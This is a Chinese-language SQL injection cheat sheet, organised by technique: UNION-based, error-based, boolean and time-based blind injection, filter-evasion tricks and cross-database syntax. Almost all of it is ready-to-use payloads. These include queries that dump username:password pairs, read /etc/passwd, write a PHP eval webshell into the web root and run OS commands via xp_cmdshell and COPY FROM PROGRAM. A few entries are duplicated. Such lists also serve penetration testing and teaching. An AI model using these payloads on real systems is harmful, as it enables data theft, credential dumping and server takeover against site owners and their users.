# 基础SQL注入语句大全

## 一、注入点探测语句
```sql
1. 单引号测试：' 
2. 逻辑测试：
   ' AND 1=1 -- 恒真条件
   ' AND 1=2 -- 恒假条件
3. 注释符测试：
   MySQL: ' --+ 
   MSSQL: ' --
   Oracle: ' --
```

## 二、联合查询注入（UNION-Based）

```sql
1. 确定字段数（二分法）：
   ' ORDER BY 5--+
   
2. 验证回显位置：
   ' UNION SELECT 1,2,3--+

3. 获取数据库信息：
   ' UNION SELECT version(),user(),database()--+

4. 获取所有数据库名（MySQL）：
   ' UNION SELECT 1,group_concat(schema_name),3 
   FROM information_schema.schemata--+
 
5. 获取所有数据库名（MySQL）：
   ' UNION SELECT 1,GROUP_CONCAT(schema_name),3 
   FROM information_schema.schemata--+

6. 获取指定数据库的表名：
   ' UNION SELECT 1,GROUP_CONCAT(table_name),3 
   FROM information_schema.tables 
   WHERE table_schema='testdb'--+

7. 获取表的列名：
   ' UNION SELECT 1,GROUP_CONCAT(column_name),3 
   FROM information_schema.columns 
   WHERE table_name='users'--+

8. 拖取整张表数据：
   ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 
   FROM users--+
   -- 输出格式：admin:123456,user:qwerty
```



## 三、报错注入（Error-Based）

```sql
1. MySQL报错：
   ' AND updatexml(1,concat(0x7e,version()),1)--+
   
2. MSSQL报错：
   ' AND 1=convert(int,(SELECT @@version))-- 

3. Oracle报错：
   ' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))--+
   
4. 通用payload：
   ' OR (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand()*2))x 
   FROM information_schema.tables GROUP BY x)a)--+
   
5. MySQL报错获取数据：
   ' AND updatexml(1,concat(0x7e,
   (SELECT GROUP_CONCAT(user,0x3a,password) FROM users)),1)--+

6. 嵌套使用（多级查询）：
   ' OR (SELECT 1 FROM (SELECT 
   GROUP_CONCAT(table_name) FROM information_schema.tables)x)--+
```



## 四、布尔盲注（Boolean-Based）

```sql
1. 基础判断：
   ' AND 1=1 -- 返回正常
   ' AND 1=2 -- 返回异常

2. 猜解数据长度：
   ' AND length(database())=5 --+

3. 逐位猜解字符（ASCII码）：
   ' AND ascii(substr(database(),1,1))>100 --+

4. 判断表是否存在：
   ' AND (SELECT count(*) FROM information_schema.tables 
   WHERE table_schema=database() AND table_name='users')=1 --+
   
5. 布尔盲注猜解表名：
   ' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables 
   WHERE table_schema=database()) LIKE '%user%'--+
```



## 五、时间盲注（Time-Based）

```sql
1. MySQL延时：
   ' AND IF(1=1,SLEEP(5),0)--+
   
2. MSSQL延时：
   '; WAITFOR DELAY '0:0:5' --
   
3. Oracle延时：
   ' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1 --+

4. 带条件延时：
   ' AND IF(ascii(substr(user(),1,1))>100,SLEEP(5),0)--+
   
5. 时间盲注批量获取：
   ' AND IF(ASCII(SUBSTR(
   (SELECT GROUP_CONCAT(column_name) 
   FROM information_schema.columns 
   WHERE table_name='users'),1,1))>100,SLEEP(5),0)--+
```



## 六、文件操作语句

```sql
1. 读取文件（MySQL）：
   ' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--+

2. 写webshell（需写权限）：
   ' UNION SELECT "<?php @eval($_POST[cmd]);?>",2,3 
   INTO OUTFILE '/var/www/shell.php'--+

3. MSSQL文件操作：
   '; EXEC master..xp_cmdshell 'dir C:\' -- 
```



## 七、系统命令执行

```sql
1. MySQL（需FILE权限）：
   ' UNION SELECT 1,(sys_exec('whoami')),3--+

2. MSSQL：
   '; EXEC xp_cmdshell 'net user' -- 

3. PostgreSQL：
   '; DROP TABLE IF EXISTS cmd_exec; 
   CREATE TABLE cmd_exec(cmd_output text); 
   COPY cmd_exec FROM PROGRAM 'id';-- 
```



## 八、信息收集语句

```sql
1. 获取数据库版本：
   @@version (MSSQL/MySQL)
   SELECT banner FROM v$version (Oracle)

2. 获取当前用户：
   user()      -- MySQL
   current_user() -- PostgreSQL
   SYSTEM_USER -- MSSQL

3. 获取所有数据库：
   SELECT schema_name FROM information_schema.schemata (MySQL)
   SELECT name FROM master..sysdatabases (MSSQL)

4. 获取表名：
   SELECT table_name FROM information_schema.tables 
   WHERE table_schema=database() LIMIT 0,1
   
5. 获取列名：
   SELECT column_name FROM information_schema.columns 
   WHERE table_name='users' LIMIT 0,1
```



## 九、绕过过滤技巧

```sql
1. 大小写混合：
   ' UniOn SelEct 1,2,3--+

2. 内联注释（MySQL）：
   ' /*!UNION*/ SELECT 1,2,3--+

3. 十六进制编码：
   ' UNION SELECT 0x313032,2,3--+

4. 双写绕过：
   ' UNIUNIONON SELESELECTCT 1,2,3--+

5. 空字节绕过：
   ' \0UNION\0SELECT\0 1,2,3--+
   
6. 内联注释绕过：
   ' UNION SELECT 1,/*!GROUP_CONCAT*/(schema_name),3 
   FROM information_schema.schemata--+

7. 空白符分割：
   ' UNION%0BSELECT%0B1,GROUP%0D%0A_CONCAT(table_name),3 
   FROM%09information_schema.tables--+

8. 大小写混合：
   ' UniOn SelEct 1,gRoUp_CoNcAt(table_name),3 
   FrOm information_schema.tables--+
```

## 十、跨数据库语法对比（group_concat）

```sql
1. PostgreSQL (STRING_AGG)：
   ' UNION SELECT 1,STRING_AGG(table_name,','),3 
   FROM information_schema.tables--+

2. MSSQL (STUFF + FOR XML PATH)：
   ';SELECT STUFF(
   (SELECT ','+name FROM sys.databases 
   FOR XML PATH('')),1,1,'')-- 

3. Oracle (LISTAGG)：
   ' UNION SELECT 1,LISTAGG(table_name,',') 
   WITHIN GROUP (ORDER BY table_name),3 
   FROM all_tables--+
```

